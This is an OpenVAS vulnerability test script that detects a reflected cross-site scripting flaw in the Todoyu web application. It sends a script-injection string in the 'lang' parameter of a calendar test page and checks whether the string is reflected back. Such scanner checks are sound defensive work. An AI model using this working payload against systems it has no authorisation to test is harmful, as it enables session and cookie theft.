###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_todayu_xss_vuln.nasl 11987 2018-10-19 11:05:52Z mmartin $
#
# Todayu Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902416");
  script_version("$Revision: 11987 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 13:05:52 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Todayu Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100695/Todoyu2.0.8-xss.txt");
  script_xref(name:"URL", value:"http://www.securityhome.eu/exploits/exploit.php?eid=14706246374db10bfe6f4f71.12853295");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"impact", value:"Successful exploitation could allow execution of scripts or
actions written by an attacker. In addition, an attacker may obtain authorization
cookies that would allow him to gain unauthorized access to the application.");
  script_tag(name:"affected", value:"Todayu version 2.1.0 and prior");
  script_tag(name:"insight", value:"The flaw is due to failure in the 'lib/js/jscalendar/php/test.php?'
script to properly sanitize user supplied input in 'lang' parameter.");
  script_tag(name:"solution", value:"Upgrade to version 2.1.1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is running Todayu and is prone to cross site scripting
vulnerabilities.");
  script_xref(name:"URL", value:"http://www.todoyu.com/community/download");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir( make_list_unique( "/todayu", "/Todoyu", "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  res = http_get_cache(item:string(dir,"/index.php"), port:port);

  if("<title>Login - todoyu</title>" >< res)
  {
    req = http_get(item:string(dir, '/lib/js/jscalendar/php/test.php?lang="' +
                    '></script><script>alert("XSS-TEST")</script>'), port:port);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && '<script>alert("XSS-TEST")</script>' >< res)
    {
      security_message(port);
      exit(0);
    }
  }
}
